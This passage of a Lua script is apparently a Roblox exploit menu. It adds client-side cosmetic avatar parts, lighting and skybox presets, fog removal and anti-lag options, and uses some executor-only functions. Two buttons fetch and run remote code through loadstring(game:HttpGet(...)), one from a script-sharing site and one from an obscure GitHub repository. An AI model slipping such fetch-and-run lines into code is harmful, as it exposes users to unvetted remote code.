    local char = player.Character
    if not char then return end
    
    local legName = (side == "Right") and (char:FindFirstChild("Right Leg") and "Right Leg" or "RightUpperLeg") or "Left Leg"
    local leg = char:FindFirstChild(legName)
    
    if leg then
        for _, child in ipairs(leg:GetChildren()) do
            if child:IsA("SpecialMesh") then child:Destroy() end
        end
        
        leg.Color = Color3.fromRGB(50, 50, 50)
        local mesh = Instance.new("SpecialMesh")
        mesh.Name = "KorbloxMesh"
        mesh.MeshType = Enum.MeshType.FileMesh
        mesh.MeshId = meshId
        mesh.Parent = leg
    end
end

local function applyHeadless()
    local char = player.Character
    local head = char and char:FindFirstChild("Head")
    if head then
        head.Transparency = 1
        if head:FindFirstChild("face") then head.face:Destroy() end
        
        local mesh = Instance.new("SpecialMesh")
        mesh.Name = "HeadlessMesh"
        mesh.MeshType = Enum.MeshType.FileMesh
        mesh.MeshId = "rbxassetid://1095708"
        mesh.Scale = Vector3.new(0.001, 0.001, 0.001)
        mesh.Parent = head
    end
end

local function revertChanges()
    local char = player.Character
    if not char then return end
    
   
    local head = char:FindFirstChild("Head")
    if head then
        head.Transparency = 0
        local mesh = head:FindFirstChild("HeadlessMesh")
        if mesh then mesh:Destroy() end
    end
    
    
    for _, legName in pairs({"Right Leg", "RightUpperLeg", "Left Leg"}) do
        local leg = char:FindFirstChild(legName)
        if leg then
            leg.Color = Color3.new(1, 1, 1)
            local mesh = leg:FindFirstChild("KorbloxMesh")
            if mesh then mesh:Destroy() end
        end
    end
end

player.CharacterAdded:Connect(function(char)
    task.wait(1) 
    if _G.KorbloxR_Enabled then applyKorblox("Right", "rbxassetid://101851696") end
    if _G.KorbloxL_Enabled then applyKorblox("Left", "rbxassetid://101851582") end
    if _G.Headless_Enabled then applyHeadless() end
end)

Tabs.Extension:AddToggle("KorbloxRToggle", {
    Title = "Korblox (Right)",
    Description = "",
    Default = false,
    Callback = function(Value)
        _G.KorbloxR_Enabled = Value
        if Value then 
            applyKorblox("Right", "rbxassetid://101851696") 
        else 
            revertChanges() 
        end
    end
})

Tabs.Extension:AddToggle("KorbloxLToggle", {
    Title = "Korblox (Left)",
    Description = "",
    Default = false,
    Callback = function(Value)
        _G.KorbloxL_Enabled = Value
        if Value then 
            applyKorblox("Left", "rbxassetid://101851582") 
        else 
            revertChanges() 
        end
    end
})

Tabs.Extension:AddToggle("HeadlessToggle", {
    Title = "Headless",
    Description = "",
    Default = false,
    Callback = function(Value)
        _G.Headless_Enabled = Value
        if Value then 
            applyHeadless() 
        else 
            revertChanges() 
        end
    end
})


_G.Players = game:GetService("Players")
_G.LPlayer = _G.Players.LocalPlayer

_G.ExtStates = {
    Wings = false,
    Poison = false,
    Frozen = false,
    Fire = false,
    Doomsekkar = false,
}

_G.ApplySingleExt = function(id, name, state)
    if not state then
        if _G.LPlayer.Character and _G.LPlayer.Character:FindFirstChild(name) then
            _G.LPlayer.Character[name]:Destroy()
        end
        return
    end
    
    local char = _G.LPlayer.Character
    if not char or char:FindFirstChild(name) then return end
    
    local s, obj = pcall(function() return game:GetObjects("rbxassetid://" .. id)[1] end)
    if s and obj then
        obj.Name = name
        obj.Parent = char
        
        local h = obj:FindFirstChild("Handle")
        if h and h:IsA("BasePart") then
            h.CanCollide = false
            
            local w = Instance.new("Weld")
            w.Part0 = h
            
            if name == "Wings_Acc" then
                local torso = char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso")
                if torso then
                    w.Part1 = torso
                    w.C0 = obj.AttachmentPoint
                    w.C1 = CFrame.new(0, 1.7, 0.3) 
                else
                    w.Part1 = char:FindFirstChild("Head")
                    w.C0 = obj.AttachmentPoint
                    w.C1 = CFrame.new(0, 0.5, 0)
                end
            else
                w.Part1 = char:FindFirstChild("Head")
                w.C0 = obj.AttachmentPoint
                w.C1 = CFrame.new(0, 0.5, 0) 
            end
            
            w.Parent = h
        end
    end
end

_G.RefreshExts = function()
    if _G.ExtStates.Wings then _G.ApplySingleExt(192557913, "Wings_Acc", true) end
    if _G.ExtStates.Poison then _G.ApplySingleExt(1744060292, "Poison_Acc", true) end
    if _G.ExtStates.Frozen then _G.ApplySingleExt(74891470, "Frozen_Acc", true) end
    if _G.ExtStates.Fire then _G.ApplySingleExt(215718515, "Fire_Acc", true) end
    if _G.ExtStates.Doomsekkar then _G.ApplySingleExt(132809431, "Doomsekkar_Acc", true) end
    if _G.ExtStates.Frostsekkar then _G.ApplySingleExt(182672520, "Frostsekkar_Acc", true) end
    if _G.ExtStates.Infernosekkar then _G.ApplySingleExt(319643443, "Infernosekkar_Acc", true) end
    if _G.ExtStates.PoisonDusekkar then _G.ApplySingleExt(174405374, "PoisonDusekkar_Acc", true) end
end

_G.LPlayer.CharacterAdded:Connect(function()
    task.wait(1.5) 
    _G.RefreshExts()
end)

Tabs.Extension:AddParagraph({
        Title = " ",
        Content = ""
    })

Tabs.Extension:AddToggle("TogWings", {
    Title = "Angelic Wings",
    Default = false,
    Callback = function(state) 
        _G.ExtStates.Wings = state 
        _G.ApplySingleExt(192557913, "Wings_Acc", state) 
    end
})

Tabs.Extension:AddToggle("TogPoison", {
    Title = "Poisonous Horns",
    Default = false,
    Callback = function(state) 
        _G.ExtStates.Poison = state 
        _G.ApplySingleExt(1744060292, "Poison_Acc", state) 
    end
})

Tabs.Extension:AddToggle("TogFrozen", {
    Title = "Frozen Horn",
    Default = false,
    Callback = function(state) 
        _G.ExtStates.Frozen = state 
        _G.ApplySingleExt(74891470, "Frozen_Acc", state) 
    end
})

Tabs.Extension:AddToggle("TogFire", {
    Title = "Fire Horn",
    Default = false,
    Callback = function(state) 
        _G.ExtStates.Fire = state 
        _G.ApplySingleExt(215718515, "Fire_Acc", state) 
    end
})

Tabs.Extension:AddToggle("TogDoomsekkar", {
    Title = "Doomsekkar",
    Default = false,
    Callback = function(state) 
        _G.ExtStates.Doomsekkar = state 
        _G.ApplySingleExt(132809431, "Doomsekkar_Acc", state) 
    end
})

Tabs.Extension:AddButton({
    Title = "AvatarChanger",
    Description = "",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-client-avatar-changer-92130"))()
    end
})

Tabs.Extension:AddSection("Camera Extension")

Tabs.Extension:AddButton({
        Title = "sensitivity",
        Description = "",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/inuaposzoawjsjs-glitch/.githubasset/refs/heads/master/MODDEDFLUENT/Sensitivity.lua"))()
        end
    }
)

Tabs.Extension:AddSection("Shader Extension")

local function ClearLighting()
    for _, child in ipairs(Lighting:GetChildren()) do
        if child.Name ~= "MenuBlur" then
            child:Destroy()
        end
    end
end

Tabs.Extension:AddButton(
    {
        Title = "Day",
        Description = "",
        Callback = function()
            ClearLighting()

            Lighting.Ambient = Color3.new(0, 0, 0)
            Lighting.OutdoorAmbient = Color3.new(0.568627, 0.501961, 0.372549)
            Lighting.Brightness = 3.130000114440918
            Lighting.ClockTime = 14.5
            Lighting.ExposureCompensation = 0
            Lighting.FogColor = Color3.new(0.572549, 0.815686, 1)
            Lighting.FogEnd = 3000
            Lighting.FogStart = 300
            Lighting.GlobalShadows = true
            Lighting.GeographicLatitude = 143
            Lighting.EnvironmentDiffuseScale = 0.5830000042915344
            Lighting.EnvironmentSpecularScale = 1
            Lighting.ShadowSoftness = 0.03999999910593033
            Lighting.ColorShift_Top = Color3.new(0.737255, 0.552941, 0.00392157)
            Lighting.ColorShift_Bottom = Color3.new(0, 0, 0)
            Lighting.Technology = Enum.Technology.ShadowMap
            Lighting.TimeOfDay = "14:30:00"

            local Sky = Instance.new("Sky")
            Sky.Name = "Sky"
            Sky.SkyboxBk = "rbxassetid://6444884337"
            Sky.SkyboxDn = "rbxassetid://6444884785"
            Sky.SkyboxFt = "rbxassetid://6444884337"
            Sky.SkyboxLf = "rbxassetid://6444884337"
            Sky.SkyboxRt = "rbxassetid://6444884337"
            Sky.SkyboxUp = "rbxassetid://6412503613"
            Sky.MoonAngularSize = 11
            Sky.SunAngularSize = 11
            Sky.MoonTextureId = "rbxassetid://6444320592"
            Sky.SunTextureId = "rbxassetid://1084351190"
            Sky.StarCount = 0
            Sky.Parent = Lighting

            local Bloom = Instance.new("BloomEffect")
            Bloom.Name = "Bloom"
            Bloom.Enabled = true
            Bloom.Intensity = 1
            Bloom.Threshold = 2
            Bloom.Size = 90
            Bloom.Parent = Lighting

            local ColorCorrection = Instance.new("ColorCorrectionEffect")
            ColorCorrection.Name = "ColorCorrection"
            ColorCorrection.Enabled = true
            ColorCorrection.Brightness = 0.03999999910593033
            ColorCorrection.Contrast = 0.1899999976158142
            ColorCorrection.Saturation = 0.11999999731779099
            ColorCorrection.TintColor = Color3.new(1, 1, 1)
            ColorCorrection.Parent = Lighting
        end
    }
)

Tabs.Extension:AddButton(
    {
        Title = "Sunset",
        Description = "",
        Callback = function()
            ClearLighting()

            Lighting.Ambient = Color3.new(0.67451, 0.67451, 0.67451)
            Lighting.OutdoorAmbient = Color3.new(0, 0, 0)
            Lighting.Brightness = 3.799999952316284
            Lighting.ClockTime = 7.099999904632568
            Lighting.ExposureCompensation = -0.23999999463558197
            Lighting.FogColor = Color3.new(0, 0, 0)
            Lighting.FogEnd = 100000000
            Lighting.FogStart = 20
            Lighting.GlobalShadows = true
            Lighting.GeographicLatitude = 72
            Lighting.EnvironmentDiffuseScale = 0.30000001192092896
            Lighting.EnvironmentSpecularScale = 0.05999999865889549
            Lighting.ShadowSoftness = 0.10000000149011612
            Lighting.ColorShift_Top = Color3.new(1, 0.682353, 0.168627)
            Lighting.ColorShift_Bottom = Color3.new(0, 0, 0)
            Lighting.Technology = Enum.Technology.Future
            Lighting.TimeOfDay = "07:06:00"

            local Sky = Instance.new("Sky")
            Sky.Name = "Sky"
            Sky.CelestialBodiesShown = true
            Sky.SkyboxBk = "rbxassetid://1009082031"
            Sky.SkyboxDn = "rbxassetid://1009082487"
            Sky.SkyboxFt = "rbxassetid://1009082252"
            Sky.SkyboxLf = "rbxassetid://1009082137"
            Sky.SkyboxRt = "rbxassetid://1009081946"
            Sky.SkyboxUp = "rbxassetid://1009082428"
            Sky.MoonAngularSize = 0
            Sky.SunAngularSize = 9
            Sky.MoonTextureId = "rbxasset://sky/moon.jpg"
            Sky.SunTextureId = "rbxasset://sky/sun.jpg"
            Sky.StarCount = 3000
            Sky.Parent = Lighting

            local Bloom = Instance.new("BloomEffect")
            Bloom.Name = "Bloom"
            Bloom.Enabled = true
            Bloom.Intensity = 1
            Bloom.Threshold = 1.8240000009536743
            Bloom.Size = 56
            Bloom.Parent = Lighting

            local SunRays = Instance.new("SunRaysEffect")
            SunRays.Name = "SunRays"
            SunRays.Enabled = true
            SunRays.Intensity = 0.18000000715255737
            SunRays.Spread = 0.11999999731779099
            SunRays.Parent = Lighting

            local ColorCorrection = Instance.new("ColorCorrectionEffect")
            ColorCorrection.Name = "ColorCorrection"
            ColorCorrection.Enabled = true
            ColorCorrection.Brightness = 0
            ColorCorrection.Contrast = 0.10000000149011612
            ColorCorrection.Saturation = -0.20000000298023224
            ColorCorrection.TintColor = Color3.new(1, 1, 1)
            ColorCorrection.Parent = Lighting

            local Atmosphere = Instance.new("Atmosphere")
            Atmosphere.Name = "Atmosphere"
            Atmosphere.Color = Color3.new(0.780392, 0.666667, 0.419608)
            Atmosphere.Density = 0.41999998688697815
            Atmosphere.Offset = 0
            Atmosphere.Glare = 0
            Atmosphere.Haze = 0
            Atmosphere.Parent = Lighting
        end
    }
)

Tabs.Extension:AddButton(
    {
        Title = "Shore",
        Description = "",
        Callback = function()
            ClearLighting()

            Lighting.Ambient = Color3.new(0.427451, 0.458824, 0.529412)
            Lighting.OutdoorAmbient = Color3.new(0.141176, 0.184314, 0.227451)
            Lighting.Brightness = 1.9210000038146973
            Lighting.ClockTime = -6.399722099304199
            Lighting.ExposureCompensation = -0.20000000298023224
            Lighting.FogColor = Color3.new(0.752941, 0.752941, 0.752941)
            Lighting.FogEnd = 100000
            Lighting.FogStart = 0
            Lighting.GlobalShadows = true
            Lighting.GeographicLatitude = 0
            Lighting.EnvironmentDiffuseScale = 0.1720000058412552
            Lighting.EnvironmentSpecularScale = 0.6380000114440918
            Lighting.ShadowSoftness = 0.25
            Lighting.ColorShift_Top = Color3.new(0.886275, 0.294118, 0)
            Lighting.ColorShift_Bottom = Color3.new(0.972549, 0.647059, 0.623529)
            Lighting.Technology = Enum.Technology.ShadowMap
            Lighting.TimeOfDay = "-06:23:59"

            local Sky = Instance.new("Sky")
            Sky.Name = "Sky"
            Sky.CelestialBodiesShown = true
            Sky.SkyboxBk = "rbxassetid://88585370973398"
            Sky.SkyboxDn = "rbxassetid://128014535205529"
            Sky.SkyboxFt = "rbxassetid://85323615042244"
            Sky.SkyboxLf = "rbxassetid://77415797450913"
            Sky.SkyboxRt = "rbxassetid://127566931602371"
            Sky.SkyboxUp = "rbxassetid://102320981098060"
            Sky.MoonAngularSize = 0
            Sky.SunAngularSize = 4
            Sky.MoonTextureId = "rbxasset://sky/moon.jpg"
            Sky.SunTextureId = "rbxasset://sky/sun.jpg"
            Sky.StarCount = 5000
            Sky.Parent = Lighting

            local SunRays = Instance.new("SunRaysEffect")
            SunRays.Name = "SunRays"
            SunRays.Enabled = true
            SunRays.Intensity = 0.024000000208616257
            SunRays.Spread = 0.46299999952316284
            SunRays.Parent = Lighting

            local Bloom = Instance.new("BloomEffect")
            Bloom.Name = "Bloom"
            Bloom.Enabled = true
            Bloom.Intensity = 1
            Bloom.Threshold = 2.2911999225616455
            Bloom.Size = 50
            Bloom.Parent = Lighting

            local ColorCorrection = Instance.new("ColorCorrectionEffect")
            ColorCorrection.Name = "ColorCorrection"
            ColorCorrection.Enabled = true
            ColorCorrection.Brightness = 0
            ColorCorrection.Contrast = 0.20000000298023224
            ColorCorrection.Saturation = 0
            ColorCorrection.TintColor = Color3.new(1, 1, 1)
            ColorCorrection.Parent = Lighting

            local Atmosphere = Instance.new("Atmosphere")
            Atmosphere.Name = "Atmosphere"
            Atmosphere.Color = Color3.new(1, 0.847059, 0.760784)
            Atmosphere.Density = 0.35899999737739563
            Atmosphere.Offset = 0
            Atmosphere.Glare = 2.9700000286102295
            Atmosphere.Haze = 1.5199999809265137
            Atmosphere.Parent = Lighting

            local Blur = Instance.new("BlurEffect")
            Blur.Name = "Blur"
            Blur.Size = 4
            Blur.Parent = Lighting
        end
    }
)

Tabs.Extension:AddButton(
    {
        Title = "Cloudy",
        Description = "",
        Callback = function()
            ClearLighting()

            Lighting.Ambient = Color3.new(0, 0, 0)
            Lighting.OutdoorAmbient = Color3.new(0.34902, 0.266667, 0.184314)
            Lighting.Brightness = 5.630000114440918
            Lighting.ClockTime = 17.628889083862305
            Lighting.ExposureCompensation = 0.6299999952316284
            Lighting.FogColor = Color3.new(0.572549, 0.815686, 1)
            Lighting.FogEnd = 3000
            Lighting.FogStart = 300
            Lighting.GlobalShadows = true
            Lighting.GeographicLatitude = 21.58930015563965
            Lighting.EnvironmentDiffuseScale = 0.5830000042915344
            Lighting.EnvironmentSpecularScale = 1
            Lighting.ShadowSoftness = 0.03999999910593033
            Lighting.ColorShift_Top = Color3.new(0.811765, 0.447059, 0)
            Lighting.ColorShift_Bottom = Color3.new(0, 0, 0)
            Lighting.Technology = Enum.Technology.ShadowMap
            Lighting.TimeOfDay = "17:37:44"

            local Sky = Instance.new("Sky")
            Sky.Name = "Sky"
            Sky.CelestialBodiesShown = true
            Sky.SkyboxBk = "rbxassetid://2177969403"
            Sky.SkyboxDn = "rbxassetid://2177972406"
            Sky.SkyboxFt = "rbxassetid://2177970251"
            Sky.SkyboxLf = "rbxassetid://2177969836"
            Sky.SkyboxRt = "rbxassetid://2177968823"
            Sky.SkyboxUp = "rbxassetid://2177971305"
            Sky.MoonAngularSize = 1.5
            Sky.SunAngularSize = 3
            Sky.MoonTextureId = "rbxassetid://1075087760"
            Sky.SunTextureId = "rbxasset://sky/sun.jpg"
            Sky.StarCount = 500
            Sky.Parent = Lighting

            local Bloom = Instance.new("BloomEffect")
            Bloom.Name = "Bloom"
            Bloom.Enabled = true
            Bloom.Intensity = 1
            Bloom.Threshold = 2
            Bloom.Size = 90
            Bloom.Parent = Lighting

            local ColorCorrection = Instance.new("ColorCorrectionEffect")
            ColorCorrection.Name = "ColorCorrection"
            ColorCorrection.Enabled = true
            ColorCorrection.Brightness = 0.03999999910593033
            ColorCorrection.Contrast = 0.15000000596046448
            ColorCorrection.Saturation = 0.20000000298023224
            ColorCorrection.TintColor = Color3.new(1, 1, 1)
            ColorCorrection.Parent = Lighting

            local SunRays = Instance.new("SunRaysEffect")
            SunRays.Name = "SunRays"
            SunRays.Enabled = true
            SunRays.Intensity = 0.004000000189989805
            SunRays.Spread = 0.16699999570846558
            SunRays.Parent = Lighting

            local Atmosphere = Instance.new("Atmosphere")
            Atmosphere.Name = "Atmosphere"
            Atmosphere.Color = Color3.new(0.647059, 0.647059, 0.647059)
            Atmosphere.Density = 0.3569999933242798
            Atmosphere.Offset = 0
            Atmosphere.Glare = 0.20999999344348907
            Atmosphere.Haze = 1.4600000381469727
            Atmosphere.Parent = Lighting
        end
    }
)

Tabs.Extension:AddButton(
    {
        Title = "Night",
        Description = "",
        Callback = function()
            ClearLighting()

            Lighting.Ambient = Color3.new(0, 0, 0)
            Lighting.OutdoorAmbient = Color3.new(0, 0, 0)
            Lighting.Brightness = 2
            Lighting.ClockTime = 3
            Lighting.ExposureCompensation = 0
            Lighting.FogColor = Color3.new(0, 0, 0)
            Lighting.FogEnd = 100000
            Lighting.FogStart = 0
            Lighting.GlobalShadows = true
            Lighting.GeographicLatitude = 41.733001708984375
            Lighting.EnvironmentDiffuseScale = 0
            Lighting.EnvironmentSpecularScale = 0
            Lighting.ShadowSoftness = 0.20000000298023224
            Lighting.ColorShift_Top = Color3.new(0, 0, 0)
            Lighting.ColorShift_Bottom = Color3.new(0, 0, 0)
            Lighting.Technology = Enum.Technology.Future
            Lighting.TimeOfDay = "03:00:00"

            local Sky = Instance.new("Sky")
            Sky.Name = "Sky"
            Sky.CelestialBodiesShown = true
            Sky.SkyboxBk = "rbxasset://textures/sky/sky512_bk.tex"
            Sky.SkyboxDn = "rbxasset://textures/sky/sky512_dn.tex"
            Sky.SkyboxFt = "rbxasset://textures/sky/sky512_ft.tex"
            Sky.SkyboxLf = "rbxasset://textures/sky/sky512_lf.tex"
            Sky.SkyboxRt = "rbxasset://textures/sky/sky512_rt.tex"
            Sky.SkyboxUp = "rbxasset://textures/sky/sky512_up.tex"
            Sky.MoonAngularSize = 11
            Sky.SunAngularSize = 21
            Sky.MoonTextureId = "rbxasset://sky/moon.jpg"
            Sky.SunTextureId = "rbxasset://sky/sun.jpg"
            Sky.StarCount = 5000
            Sky.Parent = Lighting

            local Blur = Instance.new("BlurEffect")
            Blur.Name = "Blur"
            Blur.Enabled = true
            Blur.Size = 0
            Blur.Parent = Lighting

            local Atmosphere = Instance.new("Atmosphere")
            Atmosphere.Name = "Atmosphere"
            Atmosphere.Color = Color3.new(0, 0, 0)
            Atmosphere.Density = 0.5600000023841858
            Atmosphere.Offset = 0
            Atmosphere.Glare = 0
            Atmosphere.Haze = 0
            Atmosphere.Parent = Lighting
        end
    }
)

Tabs.Extension:AddSection("Custom Sky")

task.spawn(function()
    local L = game:GetService("Lighting")
    local skyData = {
        ["Default"] = "",
        ["BlackHole3D"] = "rbxassetid://80849072113452",
        ["BlackHole2D"] = "rbxassetid://107612473658715",
        ["Galaxy"] = "rbxassetid://103103587555183",
        ["Saturn"] = "rbxassetid://78498232605923",
        ["Moon"] = "rbxassetid://130749862399911",
        ["Retro"] = "rbxassetid://103427685372239",
        ["BlueEye"] = "rbxassetid://127514067186397",
        ["PhantomWyrm"] = "rbxassetid://75138310179914",
        ["RetroDiscord"] = "rbxassetid://89057708562209",
        ["Cat"] = "rbxassetid://120407577036889" ,
        ["Cat2"] = "rbxassetid://127289321458446",
    }

    local skyNames = {}
    for n in pairs(skyData) do table.insert(skyNames, n) end
    table.sort(skyNames)

    Tabs.Extension:AddDropdown("SkyboxChanger", {
        Title = "Skybox Selection",
        Values = skyNames,
        Default = "Default",
        Callback = function(v)
            local id = skyData[v]
            local oldSky = L:FindFirstChild("CustomSkybox")
            if oldSky then oldSky:Destroy() end

            if v ~= "Default" and id and id ~= "" then 
                local newCs = Instance.new("Sky")
                newCs.Name = "CustomSkybox"
                local s = {"SkyboxBk", "SkyboxDn", "SkyboxFt", "SkyboxLf", "SkyboxRt", "SkyboxUp"}
                for _, side in ipairs(s) do newCs[side] = id end
                newCs.Parent = L
            end
        end
    })

Tabs.Extension:AddToggle("RainbowAmbient", {
        Title = "Rainbow Ambient",
        Default = false,
        Callback = function(Value)
            if DFunctions.rbConn then DFunctions.rbConn:Disconnect() end
            if Value then
                DFunctions.rbConn = game:GetService("RunService").RenderStepped:Connect(function()
                    local c = Color3.fromHSV((tick() * 0.2) % 1, 0.8, 1)
                    L.Ambient = c
                    L.OutdoorAmbient = c
                end)
            else
                L.Ambient = Color3.fromRGB(127, 127, 127)
                L.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
            end
        end
    })
end)

        
Tabs.Extension:AddSection("Lightning Extension")

local Lighting = game:GetService("Lighting")

local normalLighting = {
    Ambient = Lighting.Ambient,
    ColorShift_Bottom = Lighting.ColorShift_Bottom,
    ColorShift_Top = Lighting.ColorShift_Top,
    FogEnd = Lighting.FogEnd,
    FogStart = Lighting.FogStart,
    GlobalShadows = Lighting.GlobalShadows,
    ClockTime = Lighting.ClockTime,
    Brightness = Lighting.Brightness
}

local Toggle = Tabs.Extension:AddToggle("FullBright", {
    Title = "Full Bright", 
    Default = false
})

Toggle:OnChanged(function(state)
    if state then
        Lighting.Ambient = Color3.new(1, 1, 1)
        Lighting.ColorShift_Bottom = Color3.new(1, 1, 1)
        Lighting.ColorShift_Top = Color3.new(1, 1, 1)
        Lighting.FogEnd = 100000
        Lighting.GlobalShadows = false
        Lighting.ClockTime = 14
        Lighting.Brightness = 2
    else
        Lighting.Ambient = normalLighting.Ambient
        Lighting.ColorShift_Bottom = normalLighting.ColorShift_Bottom
        Lighting.ColorShift_Top = normalLighting.ColorShift_Top
        Lighting.FogEnd = normalLighting.FogEnd
        Lighting.GlobalShadows = normalLighting.GlobalShadows
        Lighting.ClockTime = normalLighting.ClockTime
        Lighting.Brightness = normalLighting.Brightness
    end
end)


Options.FullBright:SetValue(false)

local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")

local OriginalFogEnd, OriginalDensity, OriginalGlare, OriginalHaze
local FogLoop

local NoFogToggle = Tabs.Extension:AddToggle("NoFogToggle", {
    Title = "Disable Fog",
    Default = false
})

NoFogToggle:OnChanged(function(Value)
    if FogLoop then FogLoop:Disconnect() end
    
    if Value then
       
        OriginalFogEnd = Lighting.FogEnd
        local Atmosphere = Lighting:FindFirstChildOfClass("Atmosphere")
        if Atmosphere then
            OriginalDensity = Atmosphere.Density
            OriginalGlare = Atmosphere.Glare
            OriginalHaze = Atmosphere.Haze
        end

        
        FogLoop = RunService.RenderStepped:Connect(function()
            Lighting.FogEnd = 100000
            local A = Lighting:FindFirstChildOfClass("Atmosphere")
            if A then
                A.Density = 0
                A.Glare = 0
                A.Haze = 0
            end
        end)
    else
        
        if FogLoop then FogLoop:Disconnect() end
        
        Lighting.FogEnd = OriginalFogEnd or 1000
        local A = Lighting:FindFirstChildOfClass("Atmosphere")
        if A and OriginalDensity then
            A.Density = OriginalDensity
            A.Glare = OriginalGlare
            A.Haze = OriginalHaze
        end
    end
end)

Tabs.Extension:AddSection("Anti Lags Extension")

local Lag1 = false

local Toggle = Tabs.Extension:AddToggle("Anti_Lag1", {Title = "Anti Lag 1", Default = false})

Toggle:OnChanged(
    function(Value1)
        Lag1 = Value1
        if Lag1 then
            for _, v in pairs(Workspace:GetDescendants()) do
                if v:IsA("BasePart") and not v.Parent:FindFirstChild("Humanoid") then
                    v.Material = Enum.Material.SmoothPlastic
                    if v:IsA("Texture") then
                        v:Destroy()
                    end
                end
            end
        end
    end
)

Options.Anti_Lag1:SetValue(false)

local Toggle = Tabs.Extension:AddToggle("Anti_Lag2", {Title = "Anti Lag 2", Default = false})

Toggle:OnChanged(
    function(Value3)
        if Value3 then
            local decalsyeeted = true 
            local g = game
            local w = g.Workspace
            local l = g.Lighting
            local t = w.Terrain
            t.WaterWaveSize = 0
            t.WaterWaveSpeed = 0
            t.WaterReflectance = 0
            t.WaterTransparency = 0
            l.GlobalShadows = false
            l.FogEnd = 9e9
            l.Brightness = 0
            settings().Rendering.QualityLevel = "Level01"
            wait(1)
            for i, v in pairs(g:GetDescendants()) do
                if v:IsA("Part") or v:IsA("Union") or v:IsA("MeshPart") then
                    v.Material = "Plastic"
                    v.Reflectance = 0
                elseif v:IsA("Decal") and decalsyeeted then
                    v.Transparency = 1
                elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
                    v.Lifetime = NumberRange.new(0)
                end
            end
        end
    end
)

Options.Anti_Lag2:SetValue(false)

local Toggle = Tabs.Extension:AddToggle("Anti_Lag3", {Title = "Anti Lag 3", Default = false})

Toggle:OnChanged(
    function(Value4)
        if Value4 then
            local decalsyeeted = true
            local g = game
            local w = g.Workspace
            local l = g.Lighting
            local t = w.Terrain
            sethiddenproperty(l, "Technology", 2)
            sethiddenproperty(t, "Decoration", false)
            t.WaterWaveSize = 0
            t.WaterWaveSpeed = 0
            t.WaterReflectance = 0
            t.WaterTransparency = 0
            l.GlobalShadows = 0
            l.FogEnd = 9e9
            l.Brightness = 0
            settings().Rendering.QualityLevel = "Level01"
            for i, v in pairs(w:GetDescendants()) do
                if v:IsA("BasePart") and not v:IsA("MeshPart") then
                    v.Material = "Plastic"
                    v.Reflectance = 0
                elseif (v:IsA("Decal") or v:IsA("Texture")) and decalsyeeted then
                    v.Transparency = 1
                elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
                    v.Lifetime = NumberRange.new(0)
                elseif v:IsA("Explosion") then
                    v.BlastPressure = 1
                    v.BlastRadius = 1
                elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
                    v.Enabled = false
                elseif v:IsA("MeshPart") and decalsyeeted then
                    v.Material = "Plastic"
                    v.Reflectance = 0
                    v.TextureID = 10385902758728957
                elseif v:IsA("SpecialMesh") and decalsyeeted then
                    v.TextureId = 0
                elseif v:IsA("ShirtGraphic") and decalsyeeted then
                    v.Graphic = 0
                elseif (v:IsA("Shirt") or v:IsA("Pants")) and decalsyeeted then
                    v[v.ClassName .. "Template"] = 0
                end
            end
            for i = 1, #l:GetChildren() do
                e = l:GetChildren()[i]
                if
                    e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or
                        e:IsA("BloomEffect") or
                        e:IsA("DepthOfFieldEffect")
                 then
                    e.Enabled = false
                end
            end
            w.DescendantAdded:Connect(
                function(v)
                    wait(1)
                    if v:IsA("BasePart") and not v:IsA("MeshPart") then
                        v.Material = "Plastic"
                        v.Reflectance = 0
                    elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
                        v.Transparency = 1
                    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
                        v.Lifetime = NumberRange.new(0)
                    elseif v:IsA("Explosion") then
                        v.BlastPressure = 1
                        v.BlastRadius = 1
                    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
                        v.Enabled = false
                    elseif v:IsA("MeshPart") and decalsyeeted then
                        v.Material = "Plastic"
                        v.Reflectance = 0
                        v.TextureID = 10385902758728957
                    elseif v:IsA("SpecialMesh") and decalsyeeted then
                        v.TextureId = 0
                    elseif v:IsA("ShirtGraphic") and decalsyeeted then
                        v.ShirtGraphic = 0
                    elseif (v:IsA("Shirt") or v:IsA("Pants")) and decalsyeeted then
                        v[v.ClassName .. "Template"] = 0
                    end
                end
            )
        end
    end
)

Options.Anti_Lag3:SetValue(false)

Tabs.Extension:AddButton({
    Title = "No Render",
    Description = "",
    Callback = function()
        local Lighting = game:GetService("Lighting")
        local Terrain = workspace:FindFirstChildOfClass("Terrain")
        local Players = game:GetService("Players")

        
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 1e10
        Lighting.Brightness = 1

       
        if Terrain then
            Terrain.WaterWaveSize = 0
            Terrain.WaterWaveSpeed = 0
            Terrain.WaterReflectance = 0
            Terrain.WaterTransparency = 1
        end

       
        for _, obj in ipairs(workspace:GetDescendants()) do
            if obj:IsA("BasePart") then
                obj.Material = Enum.Material.Plastic
                obj.Reflectance = 0
            elseif obj:IsA("Decal") or obj:IsA("Texture") or obj:IsA("ParticleEmitter") or obj:IsA("Trail") then
                obj:Destroy()
            elseif obj:IsA("PointLight") or obj:IsA("SpotLight") or obj:IsA("SurfaceLight") then
                obj:Destroy()
            end
        end

        for _, player in ipairs(Players:GetPlayers()) do
            local char = player.Character
            if char then
                for _, part in ipairs(char:GetDescendants()) do
                    if part:IsA("Accessory") or part:IsA("Clothing") then
                        part:Destroy()
                    end
                end
            end
        end
        
    end
})

Tabs.Extension:AddParagraph({
        Title = " ",
        Content = ""
    })

task.spawn(function()
    Lighting = game:GetService("Lighting")
    defaultGlobalShadows = Lighting.GlobalShadows
    defaultTechnology = Lighting.Technology

    Tabs.Extension:AddToggle("ShadowsToggle", {
        Title = "Remove All Shadows",
        Description = "",
        Default = false,
        Callback = function(state)
            if state then
                Lighting.GlobalShadows = false
                Lighting.Technology = Enum.Technology.Compatibility
                for _, obj in ipairs(workspace:GetDescendants()) do
                    if obj:IsA("BasePart") then
                        obj.CastShadow = false
                    end
                end
            else
                Lighting.GlobalShadows = defaultGlobalShadows
